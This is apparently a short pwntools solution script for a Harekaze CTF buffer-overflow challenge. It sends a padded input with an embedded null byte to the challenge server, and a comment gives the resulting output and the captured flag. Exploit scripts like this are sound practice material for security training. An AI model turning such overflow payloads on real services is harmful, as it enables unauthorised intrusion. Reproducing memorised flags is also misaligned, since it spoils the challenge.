from pwn import *

r = remote('problem.harekaze.com', 20328)

r.sendlineafter(':', 'cow\x00' + 'A'*4 + 'isoroku')
r.sendlineafter(':', '')
r.sendlineafter(':', '')
r.sendlineafter(':', '')
print r.recv()
'''
output : 
"moo" "moo"
isoroku: "flag is here" "flag is here"
HarekazeCTF{7h1s_i5_V3ry_B3ginning_BoF}
'''
